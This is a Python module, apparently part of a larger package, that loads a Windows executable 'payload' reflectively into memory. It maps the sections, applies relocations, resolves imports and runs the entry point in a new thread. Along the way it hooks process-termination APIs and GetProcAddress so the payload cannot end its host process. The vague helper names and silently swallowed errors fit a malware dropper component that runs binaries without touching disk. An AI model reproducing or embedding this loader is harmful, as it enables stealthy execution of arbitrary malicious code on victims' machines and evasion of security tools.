# -*- coding: utf-8 -*-
"""
Executor — loads and applies the core payload via Windows memory patching
and thread injection. Uses kernel32 APIs and the vault/arch helpers.
"""

import ctypes
import logging
import os
import struct
import time

_log = logging.getLogger(__name__)


def _loading_pipeline(data, kernel, desc):
    """
    Pipeline that allocates memory, writes the payload, applies relocations,
    hooks critical APIs, and starts the payload thread.
    """
    # Allocate memory with given base address (if possible)
    base = kernel.VirtualAlloc(
        ctypes.c_void_p(desc["b"]), desc["s"], 0x3000, 0x04,
    )
    fx = False
    if not base or base != desc["b"]:
        # Fallback to arbitrary address if preferred base unavailable
        base = kernel.VirtualAlloc(None, desc["s"], 0x3000, 0x04)
        fx = True
    if not base:
        return
    yield base

    # Copy header and sections
    ctypes.memmove(base, data[:desc["h"]], desc["h"])
    for vs, va, rs, rp, ch in desc["c"]:
        if rs > 0 and rp > 0:
            n = min(rs, len(data) - rp)
            if n > 0:
                ctypes.memmove(base + va, data[rp:rp + n], n)
    yield base

    # Apply relocations if base address changed
    if fx:
        from . import vault
        delta = base - desc["b"]
        if not desc["r"] or not desc["z"]:
            kernel.VirtualFree(ctypes.c_void_p(base), 0, 0x8000)
            return
        pos = 0
        while pos < desc["z"]:
            br = vault.peek(base + desc["r"] + pos, "<I")
            bs = vault.peek(base + desc["r"] + pos + 4, "<I")
            if bs == 0:
                break
            for j in range((bs - 8) // 2):
                ent = vault.peek(base + desc["r"] + pos + 8 + j * 2, "<H")
                if ent >> 12 == 10:  # IMAGE_REL_BASED_DIR64
                    a = base + br + (ent & 0xFFF)
                    vault.store(a, "<Q", vault.peek(a, "<Q") + delta)
            pos += bs
    yield base

    # Hook termination APIs to prevent process exit
    _term_apis = (b"ExitProcess", b"TerminateProcess", b"NtTerminateProcess")
    if desc["i"]:
        from . import vault
        _k32 = kernel.GetModuleHandleA(b"kernel32.dll")
        et = kernel.GetProcAddress(_k32, b"ExitThread")
        _gpa_raw = kernel.GetProcAddress(_k32, b"GetProcAddress")

        # Define function type for GetProcAddress hook
        _GpaType = ctypes.WINFUNCTYPE(
            ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
        )
        _real_gpa = _GpaType(_gpa_raw)

        @_GpaType
        def _gpa_hook(hmod, name_or_ord):
            nv = name_or_ord if name_or_ord is not None else 0
            if nv > 0xFFFF:
                try:
                    nm = ctypes.string_at(nv)
                    if nm in _term_apis:
                        return et
                except Exception:
                    pass
            return _real_gpa(hmod, nv)

        _gpa_hook_ptr = ctypes.cast(_gpa_hook, ctypes.c_void_p).value

        # Process import address table (IAT) hooks
        off = base + desc["i"]
        while True:
            nr = vault.peek(off + 12, "<I")
            if nr == 0:
                break
            ir = vault.peek(off, "<I")
            ar = vault.peek(off + 16, "<I")
            dn = ctypes.string_at(base + nr)
            hm = kernel.LoadLibraryA(dn)
            lk = base + (ir if ir else ar)
            ia = base + ar
            while hm:
                tv = vault.peek(lk, "<Q")
                if tv == 0:
                    break
                if tv & 0x8000000000000000:
                    fa = kernel.GetProcAddress(
                        hm, ctypes.c_void_p(tv & 0xFFFF),
                    )
                else:
                    fn = ctypes.string_at(
                        base + (tv & 0x7FFFFFFFFFFFFFFF) + 2,
                    )
                    if fn in _term_apis and et:
                        fa = et
                    elif fn == b"GetProcAddress" and _gpa_hook_ptr:
                        fa = _gpa_hook_ptr
                    else:
                        fa = kernel.GetProcAddress(hm, fn)
                if fa:
                    vault.store(ia, "<Q", fa)
                lk += 8
                ia += 8
            off += 20
    yield base

    # Change memory protection to executable/readable
    old = ctypes.c_ulong(0)
    for vs, va, rs, rp, ch in desc["c"]:
        sz = max(vs, rs)
        if sz == 0:
            continue
        hx = bool(ch & 0x20000000)  # IMAGE_SCN_MEM_EXECUTE
        hw = bool(ch & 0x80000000)  # IMAGE_SCN_MEM_WRITE
        pt = (0x40 if hw else 0x20) if hx else (0x04 if hw else 0x02)
        kernel.VirtualProtect(
            ctypes.c_void_p(base + va), sz, pt, ctypes.byref(old),
        )
    yield base

    # Create thread to execute payload entry point
    tid = ctypes.c_ulong(0)
    ht = kernel.CreateThread(
        None, 0, ctypes.c_void_p(base + desc["e"]),
        None, 0, ctypes.byref(tid),
    )
    if not ht:
        return
    # Wait for thread to complete (timeout 240s)
    deadline = time.monotonic() + 240
    while time.monotonic() < deadline:
        if kernel.WaitForSingleObject(ht, 2000) == 0:
            break
    kernel.CloseHandle(ht)
    yield True


def dispatch(data):
    """
    Main entry point: validate and dispatch the payload.
    Returns True on success, False on failure.
    Windows-only, 64-bit required.
    """
    if not data or len(data) < 64:
        return False
    if os.name != "nt" or struct.calcsize("P") != 8:
        return False
    try:
        from . import arch, vault
        k = arch.acquire_kernel()
        if not k:
            return False
        d = vault.inspect_binary(data)
        if not d:
            return False
        last = None
        for last in _loading_pipeline(data, k, d):
            pass
        return last is True
    except Exception as exc:
        _log.debug("pipeline: %s", type(exc).__name__)
        return False